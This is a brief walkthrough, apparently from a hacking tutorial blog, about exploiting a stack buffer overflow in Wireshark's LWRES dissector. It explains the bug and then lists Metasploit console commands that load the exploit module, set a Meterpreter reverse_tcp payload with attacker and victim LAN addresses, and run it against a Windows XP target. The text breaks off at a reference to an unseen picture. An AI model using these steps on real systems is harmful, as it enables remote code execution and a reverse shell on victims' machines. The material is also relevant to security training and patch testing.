Hack PC in LAN using Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow

The LWRES dissector in Wireshark version 0.9.15 through 1.0.10 and 1.2.0 through 1.2.5 allows remote attackers to execute arbitrary code due to a stack-based buffer overflow. This bug found and reported by babi. This particular exploit targets the dissect_getaddrsbyname_request function. Several other functions also contain potentially exploitable stack-based buffer overflows. The Windows version (of 1.2.5 at least) is compiled with /GS, which prevents exploitation via the return address on the stack. Sending a larger string allows exploitation using the SEH bypass method. However, this packet will usually get fragmented, which may cause additional complications. NOTE: The vulnerable code is reached only when the packet dissection is rendered. If the packet is fragmented, all fragments must be captured and reassembled to exploit this issue
Wireshark 1.2.5
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/multi/misc/wireshark_lwres_getaddrbyname
Msf exploit (wireshark_lwres_getaddrbyname)>set payload windows/meterpreter/reverse_tcp
Msf exploit (wireshark_lwres_getaddrbyname)>set lhost 192.168.1.2 (IP of Local Host)
Msf exploit (wireshark_lwres_getaddrbyname)>set rhost 192.168.1.56 (IP of Remote Host)
Msf exploit (wireshark_lwres_getaddrbyname)>set target 4
Msf exploit (wireshark_lwres_getaddrbyname)>exploit


Before running the exploit command, let say that the attacker now still collecting data using their Wireshark tool like the picture below.
